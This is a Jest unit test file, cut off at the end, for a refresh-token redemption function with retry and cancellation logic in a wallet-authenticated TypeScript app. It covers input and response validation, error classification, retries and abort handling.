import { redeemRefreshTokenWithRetries } from '@/services/auth/token-refresh.utils';
import { commonApiPost } from '@/services/api/common-api';
import { isAddress } from 'viem';
import {
  TokenRefreshError,
  TokenRefreshCancelledError,
  TokenRefreshNetworkError,
  TokenRefreshServerError,
} from '@/errors/authentication';

// Mock dependencies
jest.mock('viem', () => ({
  isAddress: jest.fn(),
}));

jest.mock('@/services/api/common-api', () => ({
  commonApiPost: jest.fn(),
}));

const mockIsAddress = isAddress as jest.MockedFunction<typeof isAddress>;
const mockCommonApiPost = commonApiPost as jest.MockedFunction<typeof commonApiPost>;

describe('token-refresh.utils', () => {
  beforeEach(() => {
    jest.clearAllMocks();
  });

  describe('redeemRefreshTokenWithRetries', () => {
    beforeEach(() => {
      mockIsAddress.mockReturnValue(true);
    });

    describe('input validation', () => {
      describe('valid inputs', () => {
        it('should accept valid wallet address, refresh token, and retry count', async () => {
          const mockResponse = {
            token: 'new-jwt-token',
            address: '0x1234567890123456789012345678901234567890',
          };
          mockCommonApiPost.mockResolvedValue(mockResponse);
          mockIsAddress.mockReturnValue(true);

          await expect(
            redeemRefreshTokenWithRetries(
              '0x1234567890123456789012345678901234567890',
              'valid-refresh-token',
              null,
              3
            )
          ).resolves.toEqual(mockResponse);
        });

        it('should accept minimum retry count (1)', async () => {
          const mockResponse = {
            token: 'new-jwt-token',
            address: '0x1234567890123456789012345678901234567890',
          };
          mockCommonApiPost.mockResolvedValue(mockResponse);
          mockIsAddress.mockReturnValue(true);

          await expect(
            redeemRefreshTokenWithRetries(
              '0x1234567890123456789012345678901234567890',
              'valid-refresh-token',
              null,
              1
            )
          ).resolves.toEqual(mockResponse);
        });

        it('should accept maximum retry count (10)', async () => {
          const mockResponse = {
            token: 'new-jwt-token',
            address: '0x1234567890123456789012345678901234567890',
          };
          mockCommonApiPost.mockResolvedValue(mockResponse);
          mockIsAddress.mockReturnValue(true);

          await expect(
            redeemRefreshTokenWithRetries(
              '0x1234567890123456789012345678901234567890',
              'valid-refresh-token',
              null,
              10
            )
          ).resolves.toEqual(mockResponse);
        });
      });

      describe('invalid wallet address', () => {
        it('should throw for null wallet address', async () => {
          await expect(
            redeemRefreshTokenWithRetries(null as any, 'token', null, 3)
          ).rejects.toThrow('Invalid walletAddress: must be non-empty string');
        });

        it('should throw for undefined wallet address', async () => {
          await expect(
            redeemRefreshTokenWithRetries(undefined as any, 'token', null, 3)
          ).rejects.toThrow('Invalid walletAddress: must be non-empty string');
        });

        it('should throw for empty string wallet address', async () => {
          await expect(
            redeemRefreshTokenWithRetries('', 'token', null, 3)
          ).rejects.toThrow('Invalid walletAddress: must be non-empty string');
        });

        it('should throw for non-string wallet address', async () => {
          await expect(
            redeemRefreshTokenWithRetries(123 as any, 'token', null, 3)
          ).rejects.toThrow('Invalid walletAddress: must be non-empty string');

          await expect(
            redeemRefreshTokenWithRetries({} as any, 'token', null, 3)
          ).rejects.toThrow('Invalid walletAddress: must be non-empty string');

          await expect(
            redeemRefreshTokenWithRetries([] as any, 'token', null, 3)
          ).rejects.toThrow('Invalid walletAddress: must be non-empty string');
        });

        it('should throw for invalid address format', async () => {
          mockIsAddress.mockReturnValue(false);

          await expect(
            redeemRefreshTokenWithRetries('not-an-address', 'token', null, 3)
          ).rejects.toThrow('Invalid wallet address format: not-an-address');
        });

        it('should throw for invalid hex characters in address', async () => {
          mockIsAddress.mockReturnValue(false);

          await expect(
            redeemRefreshTokenWithRetries('0xGGGG567890123456789012345678901234567890', 'token', null, 3)
          ).rejects.toThrow('Invalid wallet address format');
        });
      });

      describe('invalid refresh token', () => {
        beforeEach(() => {
          mockIsAddress.mockReturnValue(true);
        });

        it('should throw for null refresh token', async () => {
          await expect(
            redeemRefreshTokenWithRetries(
              '0x1234567890123456789012345678901234567890',
              null as any,
              null,
              3
            )
          ).rejects.toThrow('Invalid refreshToken: must be non-empty string');
        });

        it('should throw for undefined refresh token', async () => {
          await expect(
            redeemRefreshTokenWithRetries(
              '0x1234567890123456789012345678901234567890',
              undefined as any,
              null,
              3
            )
          ).rejects.toThrow('Invalid refreshToken: must be non-empty string');
        });

        it('should throw for empty string refresh token', async () => {
          await expect(
            redeemRefreshTokenWithRetries(
              '0x1234567890123456789012345678901234567890',
              '',
              null,
              3
            )
          ).rejects.toThrow('Invalid refreshToken: must be non-empty string');
        });

        it('should throw for non-string refresh token', async () => {
          await expect(
            redeemRefreshTokenWithRetries(
              '0x1234567890123456789012345678901234567890',
              123 as any,
              null,
              3
            )
          ).rejects.toThrow('Invalid refreshToken: must be non-empty string');
        });
      });

      describe('invalid retry count', () => {
        beforeEach(() => {
          mockIsAddress.mockReturnValue(true);
        });

        it('should throw for retry count less than 1', async () => {
          await expect(
            redeemRefreshTokenWithRetries(
              '0x1234567890123456789012345678901234567890',
              'token',
              null,
              0
            )
          ).rejects.toThrow('Invalid retryCount: must be between 1 and 10');
        });

        it('should throw for retry count greater than 10', async () => {
          await expect(
            redeemRefreshTokenWithRetries(
              '0x1234567890123456789012345678901234567890',
              'token',
              null,
              11
            )
          ).rejects.toThrow('Invalid retryCount: must be between 1 and 10');
        });

        it('should throw for negative retry count', async () => {
          await expect(
            redeemRefreshTokenWithRetries(
              '0x1234567890123456789012345678901234567890',
              'token',
              null,
              -1
            )
          ).rejects.toThrow('Invalid retryCount: must be between 1 and 10');
        });

        it('should throw for NaN retry count', async () => {
          // FIXED: Implementation now properly validates NaN
          await expect(
            redeemRefreshTokenWithRetries(
              '0x1234567890123456789012345678901234567890',
              'token',
              null,
              NaN
            )
          ).rejects.toThrow('Invalid retryCount: NaN is not allowed');
        });

        it('should throw for Infinity retry count', async () => {
          await expect(
            redeemRefreshTokenWithRetries(
              '0x1234567890123456789012345678901234567890',
              'token',
              null,
              Infinity
            )
          ).rejects.toThrow('Invalid retryCount: Infinity is not allowed');
        });
      });
    });

    describe('response validation', () => {
      it('should throw for null response', async () => {
        mockCommonApiPost.mockResolvedValue(null);

        await expect(
          redeemRefreshTokenWithRetries(
            '0x1234567890123456789012345678901234567890',
            'refresh-token',
            null,
            1
          )
        ).rejects.toThrow('Server returned null/undefined response');
      });

      it('should throw for undefined response', async () => {
        mockCommonApiPost.mockResolvedValue(undefined);

        await expect(
          redeemRefreshTokenWithRetries(
            '0x1234567890123456789012345678901234567890',
            'refresh-token',
            null,
            1
          )
        ).rejects.toThrow('Server returned null/undefined response');
      });

      it('should throw for response missing token field', async () => {
        const invalidResponse = {
          address: '0x1234567890123456789012345678901234567890',
        };
        mockCommonApiPost.mockResolvedValue(invalidResponse);

        await expect(
          redeemRefreshTokenWithRetries(
            '0x1234567890123456789012345678901234567890',
            'refresh-token',
            null,
            1
          )
        ).rejects.toThrow('Server returned invalid token');
      });

      it('should throw for response with null token', async () => {
        const invalidResponse = {
          token: null,
          address: '0x1234567890123456789012345678901234567890',
        };
        mockCommonApiPost.mockResolvedValue(invalidResponse);

        await expect(
          redeemRefreshTokenWithRetries(
            '0x1234567890123456789012345678901234567890',
            'refresh-token',
            null,
            1
          )
        ).rejects.toThrow('Server returned invalid token');
      });

      it('should throw for response with empty string token', async () => {
        const invalidResponse = {
          token: '',
          address: '0x1234567890123456789012345678901234567890',
        };
        mockCommonApiPost.mockResolvedValue(invalidResponse);

        await expect(
          redeemRefreshTokenWithRetries(
            '0x1234567890123456789012345678901234567890',
            'refresh-token',
            null,
            1
          )
        ).rejects.toThrow('Server returned invalid token');
      });

      it('should throw for response missing address field', async () => {
        const invalidResponse = {
          token: 'jwt-token',
        };
        mockCommonApiPost.mockResolvedValue(invalidResponse);

        await expect(
          redeemRefreshTokenWithRetries(
            '0x1234567890123456789012345678901234567890',
            'refresh-token',
            null,
            1
          )
        ).rejects.toThrow('Server returned invalid address');
      });

      it('should throw for response with null address', async () => {
        const invalidResponse = {
          token: 'jwt-token',
          address: null,
        };
        mockCommonApiPost.mockResolvedValue(invalidResponse);

        await expect(
          redeemRefreshTokenWithRetries(
            '0x1234567890123456789012345678901234567890',
            'refresh-token',
            null,
            1
          )
        ).rejects.toThrow('Server returned invalid address');
      });

      it('should throw for response with empty string address', async () => {
        const invalidResponse = {
          token: 'jwt-token',
          address: '',
        };
        mockCommonApiPost.mockResolvedValue(invalidResponse);

        await expect(
          redeemRefreshTokenWithRetries(
            '0x1234567890123456789012345678901234567890',
            'refresh-token',
            null,
            1
          )
        ).rejects.toThrow('Server returned invalid address');
      });

      it('should accept valid response with additional fields', async () => {
        const validResponse = {
          token: 'jwt-token',
          address: '0x1234567890123456789012345678901234567890',
          extra: 'field',
          another: 123,
        };
        mockCommonApiPost.mockResolvedValue(validResponse);

        const result = await redeemRefreshTokenWithRetries(
          '0x1234567890123456789012345678901234567890',
          'refresh-token',
          null,
          1
        );

        expect(result).toEqual(validResponse);
      });
    });

    describe('error classification', () => {
      it('should classify AbortError as TokenRefreshCancelledError', async () => {
        const abortError = new Error('Aborted');
        abortError.name = 'AbortError';
        mockCommonApiPost.mockRejectedValue(abortError);

        await expect(
          redeemRefreshTokenWithRetries(
            '0x1234567890123456789012345678901234567890',
            'refresh-token',
            null,
            1
          )
        ).rejects.toThrow(TokenRefreshCancelledError);
      });

      it('should classify network errors correctly', async () => {
        const networkErrors = [
          { code: 'NETWORK_ERROR', message: 'Network failed' },
          { code: 'ENOTFOUND', message: 'DNS lookup failed' },
          { code: 'ECONNREFUSED', message: 'Connection refused' },
          { code: 'ETIMEDOUT', message: 'Request timeout' },
        ];

        for (const error of networkErrors) {
          mockCommonApiPost.mockRejectedValue(error);

          await expect(
            redeemRefreshTokenWithRetries(
              '0x1234567890123456789012345678901234567890',
              'refresh-token',
              null,
              1
            )
          ).rejects.toThrow(TokenRefreshNetworkError);
        }
      });

      it('should classify non-network errors as generic TokenRefreshError', async () => {
        const nonNetworkErrors = [
          { code: 'UNKNOWN_ERROR', message: 'Unknown error' },
          { code: 'VALIDATION_ERROR', message: 'Validation failed' },
          { message: 'Error without code' },
          { notACode: 'NETWORK_ERROR', message: 'Misnamed property' },
        ];

        for (const error of nonNetworkErrors) {
          mockCommonApiPost.mockRejectedValue(error);

          await expect(
            redeemRefreshTokenWithRetries(
              '0x1234567890123456789012345678901234567890',
              'refresh-token',
              null,
              1
            )
          ).rejects.toThrow(TokenRefreshError);
        }
      });

      it('should classify server errors correctly', async () => {
        const serverErrors = [
          { status: 400, message: 'Bad request' },
          { status: 401, message: 'Unauthorized' },
          { status: 403, message: 'Forbidden' },
          { status: 404, message: 'Not found' },
          { status: 500, message: 'Internal server error' },
          { status: 503, message: 'Service unavailable' },
        ];

        for (const error of serverErrors) {
          mockCommonApiPost.mockRejectedValue(error);

          await expect(
            redeemRefreshTokenWithRetries(
              '0x1234567890123456789012345678901234567890',
              'refresh-token',
              null,
              1
            )
          ).rejects.toThrow(TokenRefreshServerError);
        }
      });

      it('should classify unknown errors as generic TokenRefreshError', async () => {
        const unknownError = { unknown: 'error', message: 'Something went wrong' };
        mockCommonApiPost.mockRejectedValue(unknownError);

        await expect(
          redeemRefreshTokenWithRetries(
            '0x1234567890123456789012345678901234567890',
            'refresh-token',
            null,
            1
          )
        ).rejects.toThrow(TokenRefreshError);
      });

      it('should preserve existing TokenRefreshError types', async () => {
        const existingError = new TokenRefreshNetworkError('Network issue', null);
        mockCommonApiPost.mockRejectedValue(existingError);

        try {
          await redeemRefreshTokenWithRetries(
            '0x1234567890123456789012345678901234567890',
            'refresh-token',
            null,
            1
          );
        } catch (error) {
          expect(error).toBeInstanceOf(TokenRefreshNetworkError);
          expect(error).toBe(existingError);
        }
      });
    });

    describe('API interaction', () => {
      it('should call API with correct parameters', async () => {
        const mockResponse = {
          token: 'new-jwt-token',
          address: '0x1234567890123456789012345678901234567890',
        };
        mockCommonApiPost.mockResolvedValue(mockResponse);

        await redeemRefreshTokenWithRetries(
          '0x1234567890123456789012345678901234567890',
          'refresh-token',
          'user-role',
          1
        );

        expect(mockCommonApiPost).toHaveBeenCalledWith({
          endpoint: 'auth/redeem-refresh-token',
          body: {
            address: '0x1234567890123456789012345678901234567890',
            token: 'refresh-token',
            role: 'user-role',
          },
          signal: undefined,
        });
      });

      it('should pass role when provided', async () => {
        const mockResponse = {
          token: 'new-jwt-token',
          address: '0x1234567890123456789012345678901234567890',
        };
        mockCommonApiPost.mockResolvedValue(mockResponse);

        await redeemRefreshTokenWithRetries(
          '0x1234567890123456789012345678901234567890',
          'refresh-token',
          'admin-role',
          1
        );

        expect(mockCommonApiPost).toHaveBeenCalledWith(
          expect.objectContaining({
            body: expect.objectContaining({
              role: 'admin-role',
            }),
          })
        );
      });

      it('should omit role when null', async () => {
        const mockResponse = {
          token: 'new-jwt-token',
          address: '0x1234567890123456789012345678901234567890',
        };
        mockCommonApiPost.mockResolvedValue(mockResponse);

        await redeemRefreshTokenWithRetries(
          '0x1234567890123456789012345678901234567890',
          'refresh-token',
          null,
          1
        );

        expect(mockCommonApiPost).toHaveBeenCalledWith(
          expect.objectContaining({
            body: expect.objectContaining({
              role: undefined,
            }),
          })
        );
      });

      it('should pass abort signal to API call', async () => {
        const mockResponse = {
          token: 'new-jwt-token',
          address: '0x1234567890123456789012345678901234567890',
        };
        mockCommonApiPost.mockResolvedValue(mockResponse);
        const abortController = new AbortController();

        await redeemRefreshTokenWithRetries(
          '0x1234567890123456789012345678901234567890',
          'refresh-token',
          null,
          1,
          abortController.signal
        );

        expect(mockCommonApiPost).toHaveBeenCalledWith(
          expect.objectContaining({
            signal: abortController.signal,
          })
        );
      });
    });

    describe('success scenarios', () => {
      it('should succeed on first attempt', async () => {
        const mockResponse = {
          token: 'new-jwt-token',
          address: '0x1234567890123456789012345678901234567890',
        };
        mockCommonApiPost.mockResolvedValue(mockResponse);

        const result = await redeemRefreshTokenWithRetries(
          '0x1234567890123456789012345678901234567890',
          'refresh-token',
          null,
          3
        );

        expect(result).toEqual(mockResponse);
        expect(mockCommonApiPost).toHaveBeenCalledTimes(1);
      });

      it('should validate inputs before making any API calls', async () => {
        mockIsAddress.mockReturnValue(false);

        await expect(
          redeemRefreshTokenWithRetries(
            'invalid-address',
            'refresh-token',
            null,
            3
          )
        ).rejects.toThrow('Invalid wallet address format');

        expect(mockCommonApiPost).not.toHaveBeenCalled();
      });

      it('should return valid response with all fields', async () => {
        const mockResponse = {
          token: 'new-jwt-token',
          address: '0x1234567890123456789012345678901234567890',
          extra: 'data',
        };
        mockCommonApiPost.mockResolvedValue(mockResponse);

        const result = await redeemRefreshTokenWithRetries(
          '0x1234567890123456789012345678901234567890',
          'refresh-token',
          'user-role',
          3
        );

        expect(result).toEqual(mockResponse);
        expect(result.token).toBe('new-jwt-token');
        expect(result.address).toBe('0x1234567890123456789012345678901234567890');
      });
    });

    describe('retry scenarios', () => {
      it('should retry on network error and succeed on second attempt', async () => {
        const networkError = { code: 'NETWORK_ERROR', message: 'Network failed' };
        const mockResponse = {
          token: 'new-jwt-token',
          address: '0x1234567890123456789012345678901234567890',
        };

        mockCommonApiPost
          .mockRejectedValueOnce(networkError)
          .mockResolvedValueOnce(mockResponse);

        const result = await redeemRefreshTokenWithRetries(
          '0x1234567890123456789012345678901234567890',
          'refresh-token',
          null,
          3
        );

        expect(result).toEqual(mockResponse);
        expect(mockCommonApiPost).toHaveBeenCalledTimes(2);
      });

      it('should retry on server error and succeed on third attempt', async () => {
        const serverError = { status: 500, message: 'Server error' };
        const mockResponse = {
          token: 'new-jwt-token',
          address: '0x1234567890123456789012345678901234567890',
        };

        mockCommonApiPost
          .mockRejectedValueOnce(serverError)
          .mockRejectedValueOnce(serverError)
          .mockResolvedValueOnce(mockResponse);

        const result = await redeemRefreshTokenWithRetries(
          '0x1234567890123456789012345678901234567890',
          'refresh-token',
          null,
          3
        );

        expect(result).toEqual(mockResponse);
        expect(mockCommonApiPost).toHaveBeenCalledTimes(3);
      });

      it('should retry up to specified retry count', async () => {
        const serverError = { status: 500, message: 'Server error' };
        const mockResponse = {
          token: 'new-jwt-token',
          address: '0x1234567890123456789012345678901234567890',
        };

        mockCommonApiPost
          .mockRejectedValueOnce(serverError)
          .mockRejectedValueOnce(serverError)
          .mockRejectedValueOnce(serverError)
          .mockRejectedValueOnce(serverError)
          .mockResolvedValueOnce(mockResponse);

        const result = await redeemRefreshTokenWithRetries(
          '0x1234567890123456789012345678901234567890',
          'refresh-token',
          null,
          5
        );

        expect(result).toEqual(mockResponse);
        expect(mockCommonApiPost).toHaveBeenCalledTimes(5);
      });

      it('should retry exactly N times for retryCount=N', async () => {
        const serverError = { status: 500, message: 'Server error' };

        mockCommonApiPost.mockRejectedValue(serverError);

        await expect(
          redeemRefreshTokenWithRetries(
            '0x1234567890123456789012345678901234567890',
            'refresh-token',
            null,
            3
          )
        ).rejects.toThrow(TokenRefreshServerError);

        expect(mockCommonApiPost).toHaveBeenCalledTimes(3);
      });

      it('should not retry beyond retry count', async () => {
        const serverError = { status: 500, message: 'Server error' };

        mockCommonApiPost.mockRejectedValue(serverError);

        await expect(
          redeemRefreshTokenWithRetries(
            '0x1234567890123456789012345678901234567890',
            'refresh-token',
            null,
            2
          )
        ).rejects.toThrow(TokenRefreshServerError);

        expect(mockCommonApiPost).toHaveBeenCalledTimes(2);
      });

      it('should handle intermittent failures', async () => {
        const serverError = { status: 500, message: 'Server error' };
        const mockResponse = {
          token: 'new-jwt-token',
          address: '0x1234567890123456789012345678901234567890',
        };

        mockCommonApiPost
          .mockRejectedValueOnce(serverError)
          .mockRejectedValueOnce(serverError)
          .mockResolvedValueOnce(mockResponse);

        const result = await redeemRefreshTokenWithRetries(
          '0x1234567890123456789012345678901234567890',
          'refresh-token',
          null,
          3
        );

        expect(result).toEqual(mockResponse);
        expect(mockCommonApiPost).toHaveBeenCalledTimes(3);
      });
    });

    describe('cancellation scenarios', () => {
      it('should throw immediately if cancelled before start', async () => {
        const abortController = new AbortController();
        abortController.abort();

        await expect(
          redeemRefreshTokenWithRetries(
            '0x1234567890123456789012345678901234567890',
            'refresh-token',
            null,
            3,
            abortController.signal
          )
        ).rejects.toThrow(TokenRefreshCancelledError);

        expect(mockCommonApiPost).not.toHaveBeenCalled();
      });

      it('should throw if cancelled between attempts', async () => {
        const abortController = new AbortController();
        const serverError = { status: 500, message: 'Server error' };

        mockCommonApiPost.mockImplementation(async () => {
          // Abort after first attempt
          if (mockCommonApiPost.mock.calls.length === 1) {
            abortController.abort();
          }
          throw serverError;
        });

        await expect(
          redeemRefreshTokenWithRetries(
            '0x1234567890123456789012345678901234567890',
            'refresh-token',
            null,
            3,
            abortController.signal
          )
        ).rejects.toThrow(TokenRefreshCancelledError);

        expect(mockCommonApiPost).toHaveBeenCalledTimes(1);
      });

      it('should throw if cancelled during API call', async () => {
        const abortController = new AbortController();
        const abortError = new Error('Aborted');
        abortError.name = 'AbortError';

        mockCommonApiPost.mockImplementation(async () => {
          abortController.abort();
          throw abortError;
        });

        await expect(
          redeemRefreshTokenWithRetries(
            '0x1234567890123456789012345678901234567890',
            'refresh-token',
            null,
            3,
            abortController.signal
          )
        ).rejects.toThrow(TokenRefreshCancelledError);

        expect(mockCommonApiPost).toHaveBeenCalledTimes(1);
      });

      it('should not retry after cancellation', async () => {
        const abortError = new Error('Aborted');
        abortError.name = 'AbortError';

        mockCommonApiPost.mockRejectedValue(abortError);

        await expect(
          redeemRefreshTokenWithRetries(
            '0x1234567890123456789012345678901234567890',
            'refresh-token',
            null,
            3
          )
        ).rejects.toThrow(TokenRefreshCancelledError);

        expect(mockCommonApiPost).toHaveBeenCalledTimes(1);
      });

      it('should handle AbortSignal that becomes aborted during retry loop', async () => {
        const abortController = new AbortController();
        const serverError = { status: 500, message: 'Server error' };

        let callCount = 0;
        mockCommonApiPost.mockImplementation(async () => {
          callCount++;
          if (callCount === 2) {
            // Abort after second attempt, before third
            abortController.abort();
          }
          throw serverError;
        });

        await expect(
          redeemRefreshTokenWithRetries(
            '0x1234567890123456789012345678901234567890',
            'refresh-token',
            null,
            5,
            abortController.signal
          )
        ).rejects.toThrow(TokenRefreshCancelledError);

        expect(mockCommonApiPost).toHaveBeenCalledTimes(2);
      });

      it('should handle multiple abort events gracefully', async () => {
        const abortController = new AbortController();
        
        // Abort multiple times (edge case)
        abortController.abort();
        abortController.abort();
        abortController.abort();

        await expect(
          redeemRefreshTokenWithRetries(
            '0x1234567890123456789012345678901234567890',
            'refresh-token',
            null,
            3,
            abortController.signal
          )
        ).rejects.toThrow(TokenRefreshCancelledError);

        expect(mockCommonApiPost).not.toHaveBeenCalled();
      });

      it('should handle aborted signal with reason', async () => {
        const abortController = new AbortController();
        abortController.abort('User requested cancellation');

        await expect(
          redeemRefreshTokenWithRetries(
            '0x1234567890123456789012345678901234567890',
            'refresh-token',
            null,
            3,
            abortController.signal
          )
        ).rejects.toThrow(TokenRefreshCancelledError);

        expect(mockCommonApiPost).not.toHaveBeenCalled();
      });
    });

    describe('failure scenarios', () => {
      it('should throw validation error for invalid inputs', async () => {
        await expect(
          redeemRefreshTokenWithRetries(
            '',
            'refresh-token',
            null,
            3
          )
        ).rejects.toThrow(TokenRefreshError);

        await expect(
          redeemRefreshTokenWithRetries(
            '0x1234567890123456789012345678901234567890',
            '',
            null,
            3
          )
        ).rejects.toThrow(TokenRefreshError);

        await expect(
          redeemRefreshTokenWithRetries(
            '0x1234567890123456789012345678901234567890',
            'refresh-token',
            null,
            0
          )
        ).rejects.toThrow(TokenRefreshError);
      });

      it('should throw after all retries exhausted', async () => {
        const serverError = { status: 500, message: 'Persistent error' };
        mockCommonApiPost.mockRejectedValue(serverError);

        await expect(
          redeemRefreshTokenWithRetries(
            '0x1234567890123456789012345678901234567890',
            'refresh-token',
            null,
            3
          )
        ).rejects.toThrow(TokenRefreshServerError);

        expect(mockCommonApiPost).toHaveBeenCalledTimes(3);
      });

      it('should throw last error when retries fail', async () => {
        const error1 = { status: 500, message: 'Error 1' };
        const error2 = { status: 503, message: 'Error 2' };
        const error3 = { status: 502, message: 'Error 3' };

        mockCommonApiPost
          .mockRejectedValueOnce(error1)
          .mockRejectedValueOnce(error2)
          .mockRejectedValueOnce(error3);

        try {
          await redeemRefreshTokenWithRetries(
            '0x1234567890123456789012345678901234567890',
            'refresh-token',
            null,
            3
          );
        } catch (error: any) {
          expect(error).toBeInstanceOf(TokenRefreshServerError);
          expect(error.message).toContain('502');
          expect(error.message).toContain('Error 3');
        }
      });
    });

    describe('edge cases', () => {
      it('should handle retryCount=1 (no retries)', async () => {
        const serverError = { status: 500, message: 'Server error' };
        mockCommonApiPost.mockRejectedValue(serverError);

        await expect(
          redeemRefreshTokenWithRetries(
            '0x1234567890123456789012345678901234567890',
            'refresh-token',
            null,
            1
          )
        ).rejects.toThrow(TokenRefreshServerError);

        expect(mockCommonApiPost).toHaveBeenCalledTimes(1);
      });

      it('should preserve error context through retries', async () => {
        const originalError = new Error('Original error');
        originalError.stack = 'Original stack trace';
        mockCommonApiPost.mockRejectedValue(originalError);

        try {
          await redeemRefreshTokenWithRetries(
            '0x1234567890123456789012345678901234567890',
            'refresh-token',
            null,
            2
          );
        } catch (error: any) {
          expect(error).toBeInstanceOf(TokenRefreshError);
          expect(error.cause).toBe(originalError);
        }
      });

      it('should handle malformed API responses', async () => {
        const malformedResponse = {
          data: 'unexpected structure',
        };
        mockCommonApiPost.mockResolvedValue(malformedResponse);

        await expect(
          redeemRefreshTokenWithRetries(
            '0x1234567890123456789012345678901234567890',
            'refresh-token',
            null,
            1
          )
        ).rejects.toThrow(TokenRefreshServerError);
      });

      it('should handle API timeout scenarios', async () => {
        const timeoutError = { code: 'ETIMEDOUT', message: 'Request timeout' };
        const mockResponse = {
          token: 'new-jwt-token',
          address: '0x1234567890123456789012345678901234567890',
        };

        mockCommonApiPost
          .mockRejectedValueOnce(timeoutError)
          .mockResolvedValueOnce(mockResponse);

        const result = await redeemRefreshTokenWithRetries(
          '0x1234567890123456789012345678901234567890',
          'refresh-token',
          null,
          2
        );

        expect(result).toEqual(mockResponse);
        expect(mockCommonApiPost).toHaveBeenCalledTimes(2);
      });

      it('should handle default retry count', async () => {
        const mockResponse = {
          token: 'new-jwt-token',
          address: '0x1234567890123456789012345678901234567890',
        };
        mockCommonApiPost.mockResolvedValue(mockResponse);

        const result = await redeemRefreshTokenWithRetries(
          '0x1234567890123456789012345678901234567890',
          'refresh-token',
          null
        );

        expect(result).toEqual(mockResponse);
        expect(mockCommonApiPost).toHaveBeenCalledTimes(1);
      });
    });

    describe('integration tests', () => {
      it('should work with real AbortController', async () => {
        const abortController = new AbortController();
        const mockResponse = {
          token: 'new-jwt-token',
          address: '0x1234567890123456789012345678901234567890',
        };
        mockCommonApiPost.mockResolvedValue(mockResponse);

        const result = await redeemRefreshTokenWithRetries(
          '0x1234567890123456789012345678901234567890',
          'refresh-token',
          null,
          3,
          abortController.signal
        );

        expect(result).toEqual(mockResponse);
      });

      it('should handle race conditions between cancellation and success', async () => {
        const abortController = new AbortController();
        const mockResponse = {
          token: 'new-jwt-token',
          address: '0x1234567890123456789012345678901234567890',
        };

        mockCommonApiPost.mockImplementation(async () => {
          // Simulate race condition
          await new Promise(resolve => setTimeout(resolve, 10));
          if (abortController.signal.aborted) {
            const error = new Error('Aborted');
            error.name = 'AbortError';
            throw error;
          }
          return mockResponse;
        });

        // Start the request
        const promise = redeemRefreshTokenWithRetries(
          '0x1234567890123456789012345678901234567890',
          'refresh-token',
          null,
          3,
          abortController.signal
        );

        // Cancel immediately
        abortController.abort();

        await expect(promise).rejects.toThrow(TokenRefreshCancelledError);
      });

      it('should handle rapid successive calls', async () => {
        const mockResponse = {
          token: 'new-jwt-token',
          address: '0x1234567890123456789012345678901234567890',
        };
        mockCommonApiPost.mockResolvedValue(mockResponse);

        const promises = [
          redeemRefreshTokenWithRetries('0x1234567890123456789012345678901234567890', 'token1', null, 3),
          redeemRefreshTokenWithRetries('0x1234567890123456789012345678901234567890', 'token2', null, 3),
          redeemRefreshTokenWithRetries('0x1234567890123456789012345678901234567890', 'token3', null, 3),
        ];

        const results = await Promise.all(promises);

        expect(results).toHaveLength(3);
        results.forEach(result => {
          expect(result).toEqual(mockResponse);
        });
        expect(mockCommonApiPost).toHaveBeenCalledTimes(3);
      });

      it('should work with different role values', async () => {
        const mockResponse = {
          token: 'new-jwt-token',
          address: '0x1234567890123456789012345678901234567890',
        };
        mockCommonApiPost.mockResolvedValue(mockResponse);

        const roles = [null, 'user', 'admin', 'moderator'];

        for (const role of roles) {
          await redeemRefreshTokenWithRetries(
            '0x1234567890123456789012345678901234567890',
            'refresh-token',
            role,
            3
          );

          expect(mockCommonApiPost).toHaveBeenLastCalledWith(
            expect.objectContaining({
              body: expect.objectContaining({
                role: role ?? undefined,
              }),
            })
          );
        }
      });
    });

    describe('concurrent operations tests', () => {
      it('should handle multiple concurrent refresh requests independently', async () => {
        const mockResponse = {
          token: 'new-jwt-token',
          address: '0x1234567890123456789012345678901234567890',
        };
        
        // Simulate different response times
        mockCommonApiPost
          .mockImplementationOnce(async () => {
            await new Promise(resolve => setTimeout(resolve, 50));
            return { ...mockResponse, token: 'token1' };
          })
          .mockImplementationOnce(async () => {
            await new Promise(resolve => setTimeout(resolve, 10));
            return { ...mockResponse, token: 'token2' };
          })
          .mockImplementationOnce(async () => {
            await new Promise(resolve => setTimeout(resolve, 30));
            return { ...mockResponse, token: 'token3' };
          });

        const promises = [
          redeemRefreshTokenWithRetries('0x1234567890123456789012345678901234567890', 'token1', null, 1),
          redeemRefreshTokenWithRetries('0x1234567890123456789012345678901234567890', 'token2', null, 1),
          redeemRefreshTokenWithRetries('0x1234567890123456789012345678901234567890', 'token3', null, 1),
        ];

        const results = await Promise.all(promises);

        expect(results[0].token).toBe('token1');
        expect(results[1].token).toBe('token2');
        expect(results[2].token).toBe('token3');
        expect(mockCommonApiPost).toHaveBeenCalledTimes(3);
      });

      it('should handle mixed success/failure in concurrent operations', async () => {
        const mockResponse = {
          token: 'new-jwt-token',
          address: '0x1234567890123456789012345678901234567890',
        };
        
        mockCommonApiPost
          .mockResolvedValueOnce(mockResponse)
          .mockRejectedValueOnce({ status: 500, message: 'Server error' })
          .mockResolvedValueOnce(mockResponse);

        const promises = [
          redeemRefreshTokenWithRetries('0x1234567890123456789012345678901234567890', 'token1', null, 1),
          redeemRefreshTokenWithRetries('0x1234567890123456789012345678901234567890', 'token2', null, 1),
          redeemRefreshTokenWithRetries('0x1234567890123456789012345678901234567890', 'token3', null, 1),
        ];

        const results = await Promise.allSettled(promises);

        expect(results[0].status).toBe('fulfilled');
        expect(results[1].status).toBe('rejected');
        expect(results[2].status).toBe('fulfilled');
        
        if (results[0].status === 'fulfilled') {
          expect(results[0].value).toEqual(mockResponse);
        }
        if (results[1].status === 'rejected') {
          expect(results[1].reason).toBeInstanceOf(TokenRefreshServerError);
        }
        if (results[2].status === 'fulfilled') {
          expect(results[2].value).toEqual(mockResponse);
        }
      });

      it('should handle concurrent cancellations without interference', async () => {
        const controller1 = new AbortController();
        const controller2 = new AbortController();
        const controller3 = new AbortController();

        // Cancel them immediately (no race condition with setTimeout)
        controller1.abort();
        controller2.abort();
        controller3.abort();

        const promises = [
          redeemRefreshTokenWithRetries('0x1234567890123456789012345678901234567890', 'token1', null, 3, controller1.signal),
          redeemRefreshTokenWithRetries('0x1234567890123456789012345678901234567890', 'token2', null, 3, controller2.signal),
          redeemRefreshTokenWithRetries('0x1234567890123456789012345678901234567890', 'token3', null, 3, controller3.signal),
        ];

        const results = await Promise.allSettled(promises);

        results.forEach(result => {
          expect(result.status).toBe('rejected');
          if (result.status === 'rejected') {
            expect(result.reason).toBeInstanceOf(TokenRefreshCancelledError);
          }
        });
      });

      it('should handle race condition between success and cancellation', async () => {
        const abortController = new AbortController();
        const mockResponse = {
